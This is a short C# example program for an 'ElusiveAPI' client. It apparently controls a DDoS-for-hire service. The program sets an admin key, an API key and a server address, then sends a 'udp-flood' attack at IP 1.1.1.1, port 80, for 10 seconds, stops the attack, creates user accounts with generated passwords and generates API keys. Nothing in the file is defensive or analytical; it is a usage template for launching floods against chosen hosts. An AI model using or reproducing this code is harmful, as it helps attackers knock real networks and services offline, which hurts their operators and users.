using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ElusiveAPI;

namespace ElusiveAPITest
{
    class Program
    {
        public static API api = new API(); // Initialize API

        public const string ADMINISTRATOR_API_KEY = "your_administrator_api_key";

        public const string API_KEY = "your_api_key";

        public const string SERVER_IP = "http://your_server_ip";

        static void Main(string[] args)
        {
            api.set_admin_key(ADMINISTRATOR_API_KEY); // Add Administrator Key
            api.set_api_key(API_KEY); // Add API Key
            api.set_server_ip(SERVER_IP); // Set server IP the API is being hosted on


            /* Sending Attack */

            bool attack_sent = api.SendAttack("1.1.1.1", 80, 10, "udp-flood"); // IP, Port, Time, Method

            Console.WriteLine("Attack sent -> " + attack_sent); // --> True or False whether API succeeded sending attack

            /* Stopping Attacks */

            bool stopped_attack = api.StopAttack("1.1.1.1");

            Console.WriteLine("Stopped attack -> " + stopped_attack); // --> True or False whether API succeeded stopping attack

            /* Creating accounts */

            string[] credentials = api.create_account("test_username"); // --> Returns an array || Index 0 = Username || Index 1 = Password

            Console.WriteLine($"Username = {credentials[0]} || Password = {credentials[1]}");

            /* Generating API Keys */

            string api_key = api.GenerateAPIKey();

            Console.WriteLine("API Key: " + api_key); // Output --> Api Key

            Console.ReadLine();
        }
    }
}
